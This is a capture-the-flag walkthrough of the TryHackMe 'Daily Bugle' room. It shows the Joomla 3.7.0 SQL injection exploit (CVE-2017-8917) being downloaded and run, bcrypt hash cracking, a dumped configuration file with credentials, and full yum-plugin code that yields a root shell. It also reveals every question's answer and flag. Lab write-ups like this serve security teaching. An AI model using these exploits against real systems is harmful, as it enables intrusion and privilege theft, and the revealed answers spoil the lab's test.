# Daily Bugle — TryHackMe Walkthrough

> Compromise a Joomla CMS account via SQL Injection, practise cracking hashes and escalate your privileges by taking advantage of yum.

<p align="center">
  <a href="https://imgbb.com/"><img src="https://i.ibb.co/1GT581hw/5a1494ff275a366be8418a9bf831847c.png" alt="5a1494ff275a366be8418a9bf831847c" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/dailybugle">
    <img src="https://img.shields.io/badge/TryHackMe-Daily%20Bugle-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Hard-red">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Joomla%20%7C%20SQLi%20%7C%20Hash%20Cracking%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Poking |
| 3 | Joomla Enumeration (JoomScan) |
| 4 | CVE-2017-8917 — Joomla! 3.7.0 SQL Injection |
| 5 | Hash Cracking (bcrypt via John the Ripper) |
| 6 | Stored Passwords in Configuration Files |
| 7 | Misconfigured Sudo Binary (yum) |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Identify a Joomla CMS installation and enumerate its version
- Use JoomScan to profile a Joomla target
- Exploit CVE-2017-8917 using a Python SQL injection script to extract user credentials
- Crack a bcrypt hash using John the Ripper with a wordlist
- Log in to the Joomla admin panel and upload a PHP reverse shell via template editing
- Extract database credentials from a CMS configuration file
- Escalate privileges using a misconfigured `sudo` rule on `yum` via GTFOBins

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, JoomScan, John the Ripper, and Netcat installed
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)
- Note: The machine may take up to 2 minutes to fully configure after deployment

---

## Task 1 — Deploy

---

### Step 1 — Network Enumeration

**Approach:** Run an aggressive Nmap scan to identify open ports and the services running on the target.

```
kali@kali:~/CTFs/tryhackme/Daily Bugle$ sudo nmap -A -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 14:44 CEST
Nmap scan report for Machine_IP
Host is up (0.038s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.41 seconds
```

> **Note:** Three ports are open — **SSH on 22**, **HTTP on 80**, and **MySQL on 3306**. The Nmap HTTP scan immediately identifies the site as a **Joomla! CMS** via the `http-generator` header. The `robots.txt` file already leaks 15 disallowed paths, including `/administrator/` — the Joomla admin panel. Port 3306 being externally visible is a misconfiguration, though it returns `unauthorized` for direct connections.

---

### Question 1 — Who robbed the bank?

**Approach:** Navigate to `http://Machine_IP` in your browser. The homepage of the Daily Bugle newspaper reveals the answer as the main headline story.

<p align="center">
  <img src="https://miro.medium.com/v2/resize:fit:828/format:webp/1*VKzFYyXbr65VWsUaanNmVA.png" alt="Daily Bugle homepage showing the bank robbery headline" />
</p>

<details>
<summary>Reveal Answer</summary>

**`SpiderMan`**

</details>

---

## Task 2 — Obtain User and Root

---

### Step 2 — Joomla Version Enumeration with JoomScan

**Approach:** Use JoomScan to fingerprint the Joomla installation, identify its version, and discover any exposed paths or misconfigurations.

```
joomscan --url http://Machine_IP/
```

```
[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://Machine_IP/administrator/components
http://Machine_IP/administrator/modules
http://Machine_IP/administrator/templates
http://Machine_IP/images/banners

[+] admin finder
[++] Admin page : http://Machine_IP/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://Machine_IP/robots.txt

Interesting path found from robots.txt
http://Machine_IP/joomla/administrator/
http://Machine_IP/administrator/
http://Machine_IP/bin/
http://Machine_IP/cache/
http://Machine_IP/cli/
http://Machine_IP/components/
http://Machine_IP/includes/
http://Machine_IP/installation/
http://Machine_IP/language/
http://Machine_IP/layouts/
http://Machine_IP/libraries/
http://Machine_IP/logs/
http://Machine_IP/modules/
http://Machine_IP/plugins/
http://Machine_IP/tmp/

Your Report : reports/Machine_IP/
```

> **Note:** JoomScan identifies the Joomla version as **3.7.0**. Even though JoomScan reports the core as "not vulnerable", Joomla 3.7.0 is affected by **CVE-2017-8917** — a SQL injection vulnerability in the `com_fields` component that is not always detected by automated scanners. Always cross-reference findings with Exploit-DB manually.

---

### Question 2 — What is the Joomla version?

<details>
<summary>Reveal Answer</summary>

**`3.7.0`**

</details>

---

### Step 3 — Exploiting CVE-2017-8917 to Extract Credentials

**Approach:** Rather than using SQLMap, use the targeted Python exploit `joomblah.py` which automates the SQL injection for Joomla 3.7.0. Download and run it against the target to extract admin user credentials from the database.

Reference: [Exploit-DB #42033 — Joomla! 3.7.0 com_fields SQL Injection](https://www.exploit-db.com/exploits/42033)

```
kali@kali:~/CTFs/tryhackme/Daily Bugle$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
--2020-10-13 14:53:48--  https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
Resolving raw.githubusercontent.com... 151.101.112.133
Connecting to raw.githubusercontent.com|151.101.112.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6024 (5.9K) [text/plain]
Saving to: 'joomblah.py'

joomblah.py                100%[================================>]   5.88K  --.-KB/s    in 0.007s

2020-10-13 14:53:48 (819 KB/s) - 'joomblah.py' saved [6024/6024]

kali@kali:~/CTFs/tryhackme/Daily Bugle$ python joomblah.py http://Machine_IP/

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

> **Note:** The script successfully extracts the admin user `jonah` and their password hash: `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`. The `$2y$10$` prefix identifies this as a **bcrypt** hash with a cost factor of 10 — a slow hashing algorithm designed to resist brute-forcing. We will crack it using John the Ripper.

---

### Step 4 — Cracking the bcrypt Hash with John the Ripper

**Approach:** Save the extracted hash to a file and run John the Ripper against it using the `rockyou.txt` wordlist.

```
kali@kali:~/CTFs/tryhackme/Daily Bugle$ echo -n '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah.hash
kali@kali:~/CTFs/tryhackme/Daily Bugle$ john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:09:58 DONE (2020-10-13 15:05) 0.001670g/s 78.26p/s 78.26c/s 78.26C/s sweetsmile..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> **Note:** John cracks the hash after approximately 10 minutes — bcrypt is intentionally slow, which is why it took longer than an MD5 or SHA1 crack would. The cracked password is **`spiderman123`**. Use these credentials to log in to the Joomla admin panel at `http://Machine_IP/administrator/`. Once inside, navigate to **Extensions > Templates > Templates**, select a template, and edit a PHP file (e.g., `error.php`) to insert a PHP reverse shell.

---

### Question 3 — What is Jonah's cracked password?

<details>
<summary>Reveal Answer</summary>

**`spiderman123`**

</details>

---

### Step 5 — Getting a Shell and Finding the User Flag

**Approach:** After inserting a PHP reverse shell into the Joomla template and triggering it, the shell connects as `www-data`. Read the Joomla configuration file to find database credentials, then use them to switch to the system user `jjameson`.

```
sh-4.2$ cat /var/www/html/configuration.php
```

```php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}
```

> **Note:** The Joomla `configuration.php` file contains the database password **`nv5uz9r3ZEDzVjNu`** stored in plaintext. This is standard for CMS installations — the application needs the password to connect to the database at runtime. The key finding here is that the system user `jjameson` has reused this same password for their Linux account, which allows us to switch users directly.

```
sh-4.2$ su - jjameson
Password: nv5uz9r3ZEDzVjNu
id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
cd ~
ls
user.txt
cat user.txt
27a260fe3cba712cfdedb1c86d80442e
```

---

### Question 4 — What is the user flag?

<details>
<summary>Reveal Answer</summary>

**`27a260fe3cba712cfdedb1c86d80442e`**

</details>

---

### Step 6 — Privilege Escalation via Misconfigured yum Sudo Rule

**Approach:** Check what commands `jjameson` can run with sudo. The output shows a passwordless sudo rule for `/usr/bin/yum`. Use the GTFOBins technique to exploit this and spawn a root shell.

```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

> **Note:** `jjameson` can run `yum` as any user without a password. `yum` is the package manager for CentOS/RHEL systems. It supports a plugin system — and since `yum` runs as root here, any plugin it loads also runs as root. The [GTFOBins yum entry](https://gtfobins.github.io/gtfobins/yum/#sudo) provides a technique to exploit this by creating a temporary malicious plugin that spawns a shell.

**Exploit — yum plugin injection:**

```
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79
```

> **Note:** The exploit creates three files in a temporary directory: `x` is a custom `yum` configuration that points to the temp directory for plugins, `y.conf` enables the plugin, and `y.py` is the malicious Python plugin itself. When `sudo yum` loads this plugin, the `init_hook` function runs `os.execl('/bin/sh', '/bin/sh')` — replacing the yum process with a root shell. The `sh-4.2#` prompt confirms root access.

---

### Question 5 — What is the root flag?

<details>
<summary>Reveal Answer</summary>

**`eec3d53292b1821868266858d7fa6f79`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found SSH (22), HTTP (80) running Joomla, MySQL (3306) |
| 2 | Web homepage inspection | Identified bank robber as SpiderMan from the headline |
| 3 | JoomScan enumeration | Confirmed Joomla version 3.7.0, discovered `/administrator/` path |
| 4 | joomblah.py SQLi exploit (CVE-2017-8917) | Extracted admin user `jonah` and bcrypt password hash |
| 5 | John the Ripper hash crack | Cracked bcrypt hash → `spiderman123` |
| 6 | Joomla admin login + template PHP injection | Gained reverse shell as `www-data` |
| 7 | `configuration.php` inspection | Found database password `nv5uz9r3ZEDzVjNu` in plaintext |
| 8 | `su - jjameson` with database password | Switched to user `jjameson`, read `user.txt` |
| 9 | `sudo -l` enumeration | Discovered passwordless sudo rule for `yum` |
| 10 | GTFOBins yum plugin injection | Spawned root shell, read `root.txt` |
